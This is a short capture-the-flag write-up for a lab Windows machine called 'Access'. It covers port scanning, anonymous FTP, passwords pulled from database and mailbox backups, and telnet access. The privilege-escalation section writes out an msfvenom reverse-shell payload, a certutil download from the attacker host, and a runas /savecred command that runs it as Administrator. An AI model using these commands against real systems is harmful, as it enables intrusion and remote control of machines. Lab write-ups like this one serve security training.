# Access Writeup


## Enumeration

#### Port Scanning
```
# Nmap 7.91 scan initiated Thu Nov 25 17:09:04 2021 as: nmap -T4 -oN nmapInitial 10.129.220.251
Nmap scan report for 10.129.220.251
Host is up (0.065s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

# Nmap done at Thu Nov 25 17:09:12 2021 -- 1 IP address (1 host up) scanned in 7.79 seconds
```

## Initial Access

First tried anonymous ftp login, which worked. I got a **backup.mdb** file, and a password-protected **Access Control.zip**. I ran _strings_ on the **.mdb** file and found a string that looked like a password, so I ran _mdb-tables_ on **backup.mdb**, and found an auth_user table, then ran `mdb-export backup.mdb auth_user` against it. This revealed the same password I saw in the _strings_ output. 

With this password, I tried it on the **.zip** file, and that also worked. This gave me a **.pst** file, which I ran _readpst_ on, giving me a **.mbox** file containing another password for the _security_ user. 

Then, I was able to telnet in as the security user, giving me a user shell. 

## Privelege Escalation

I was lost with this privesc, so I had to cheat and look it up. Now I know to run `net user` to list all users, `net user <username>` on each user, if an admin user has "Password Required" set to No, and/or the output of `cmdkey /list` shows stored credentials for that user, it's very likely you can get privesc with `runas.exe`.

`runas` is a Windows program that allows you to run a program as another user, similar to `su` or `sudo`. 

First I created a payload for a reverse shell:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.131 LPORT=1337 -f psh -o reverse.ps1`

Then, I downloaded it from my attack machine:
`certutil  -urlcache -split -f http://10.10.16.131/reverse.ps1 reverse.ps1`

Finally, I ran the command that called out to my listener:
`runas /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -NoExit -File c:\users\security\reverse.ps1"`

Got root.
